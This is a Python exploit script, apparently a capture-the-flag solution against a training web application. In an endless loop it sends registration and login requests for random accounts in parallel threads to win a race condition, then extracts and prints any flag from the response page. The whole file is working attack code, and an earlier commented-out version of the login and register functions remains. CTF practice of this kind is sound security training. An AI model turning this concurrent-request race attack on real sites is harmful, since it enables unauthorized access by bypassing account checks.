import sys
import requests
from time import sleep
from threading import Thread
import string
import random

base_url = "http://meta.training.jinblack.it/"


def random_user():
    username = ''.join(random.choice(string.ascii_lowercase) for i in range(10))
    password = ''.join(random.choice(string.ascii_lowercase) for i in range(10))
    return username, password

""" def login(session, username, password):
    login_url = base_url + 'login.php'
    response = session.post(login_url, data={'username': username, 'password': password})
    if 'flag' in response.text:
        flag = response.text.split('flag{')[1].split('}')[0]
        print('flag{' + flag + '}')
    return response.text

def register(session, username, password):
    register_url = base_url + 'register.php'
    response = session.post(register_url, data={'username': username, 'password_1': password, 'password_2': password})
    return response.text """

def login(session, username, password, log_user = "randomstuff"):
    url = base_url + '/login.php'
    data = {'username': username, 'password': password, 'log_user': log_user}
    response = session.post(url, data=data)
    response = session.get(base_url)
    if('flag' in response.text):
        flag = response.text.split('flag{')[1].split('}')[0]
        print('flag{' + flag + '}')
    return response.text

def register(session, username, password, reg_user = "randomstuff"):
    url = base_url + '/register.php'
    data = {'username': username, 'password_1': password, 'password_2': password, 'reg_user': reg_user}
    response = session.post(url, data=data)
    return response.text

while True:
    s = requests.Session()
    user, password = random_user()

    reg_thread = Thread(target=register, args=(s, user, password))
    log_thread = Thread(target=login, args=(s, user, password))

    reg_thread.start()
    log_thread.start()

    reg_thread.join()
    log_thread.join()

    sleep(.05)
